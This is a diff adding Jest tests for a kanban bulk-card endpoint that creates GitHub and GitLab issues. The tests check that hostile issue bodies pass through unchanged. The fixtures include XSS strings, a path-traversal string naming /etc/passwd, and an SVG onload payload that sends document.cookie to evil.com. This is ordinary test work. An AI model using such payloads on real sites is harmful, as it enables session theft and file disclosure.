@@ -346,4 +346,103 @@ describe('POST /cards/bulk', () => {
     });
     expect(res.statusCode).toBe(400);
   });
+
+  it('should pass item.body containing script tags through as-is to the API', async () => {
+    mockGithubCreateIssue.mockResolvedValueOnce({
+      number: 400,
+      html_url: 'https://github.com/owner/repo/issues/400',
+    });
+
+    const maliciousBody = '<script>alert("xss")</script><img src=x onerror=alert(1)>';
+    const res = await app.inject({
+      method: 'POST',
+      url: '/api/kanban/cards/bulk',
+      payload: {
+        items: [{ title: 'Task with malicious body', body: maliciousBody }],
+        platform: 'github',
+        repo: 'owner/repo',
+      },
+    });
+
+    expect(res.statusCode).toBe(200);
+    expect(mockGithubCreateIssue).toHaveBeenCalledWith(
+      expect.objectContaining({ body: maliciousBody }),
+      'owner',
+      'repo',
+    );
+  });
+
+  it('should pass item.body containing path-traversal strings through safely', async () => {
+    mockGithubCreateIssue.mockResolvedValueOnce({
+      number: 401,
+      html_url: 'https://github.com/owner/repo/issues/401',
+    });
+
+    const traversalBody = '../../../etc/passwd\n../../secret';
+    const res = await app.inject({
+      method: 'POST',
+      url: '/api/kanban/cards/bulk',
+      payload: {
+        items: [{ title: 'Task with path traversal in body', body: traversalBody }],
+        platform: 'github',
+        repo: 'owner/repo',
+      },
+    });
+
+    expect(res.statusCode).toBe(200);
+    expect(mockGithubCreateIssue).toHaveBeenCalledWith(
+      expect.objectContaining({ body: traversalBody }),
+      'owner',
+      'repo',
+    );
+  });
+
+  it('should handle item.body with HTML event handlers without breaking', async () => {
+    mockGitlabCreateIssue.mockResolvedValueOnce({
+      iid: 60,
+      id: 2001,
+      web_url: 'https://gitlab.com/group/project/-/issues/60',
+    });
+
+    const xssBody = '"><svg/onload=fetch("https://evil.com?c="+document.cookie)>';
+    const res = await app.inject({
+      method: 'POST',
+      url: '/api/kanban/cards/bulk',
+      payload: {
+        items: [{ title: 'XSS in body', body: xssBody }],
+        platform: 'gitlab',
+        repo: 'group/project',
+      },
+    });
+
+    expect(res.statusCode).toBe(200);
+    expect(mockGitlabCreateIssue).toHaveBeenCalledWith(
+      'group/project',
+      expect.objectContaining({ description: xssBody }),
+    );
+  });
+
+  it('should default item.body to empty string when not provided', async () => {
+    mockGithubCreateIssue.mockResolvedValueOnce({
+      number: 402,
+      html_url: 'https://github.com/owner/repo/issues/402',
+    });
+
+    const res = await app.inject({
+      method: 'POST',
+      url: '/api/kanban/cards/bulk',
+      payload: {
+        items: [{ title: 'No body field' }],
+        platform: 'github',
+        repo: 'owner/repo',
+      },
+    });
+
+    expect(res.statusCode).toBe(200);
+    expect(mockGithubCreateIssue).toHaveBeenCalledWith(
+      expect.objectContaining({ body: '' }),
+      'owner',
+      'repo',
+    );
+  });
 });
